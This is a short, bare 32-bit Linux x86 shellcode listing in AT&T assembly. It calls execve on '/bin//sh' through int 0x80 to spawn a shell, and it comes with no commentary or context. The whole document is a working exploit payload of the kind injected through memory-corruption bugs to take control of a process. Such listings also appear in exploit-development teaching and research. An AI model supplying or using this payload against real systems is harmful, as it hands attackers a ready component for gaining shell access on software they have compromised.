shellcode:
    xor %eax, %eax
    push %eax
    add $0x0b, %al
    push $0x68732f2f
    push $0x6e69622f
    mov %esp, %ebx
    xor %ecx, %ecx
    xor %edx, %edx
    int $0x80
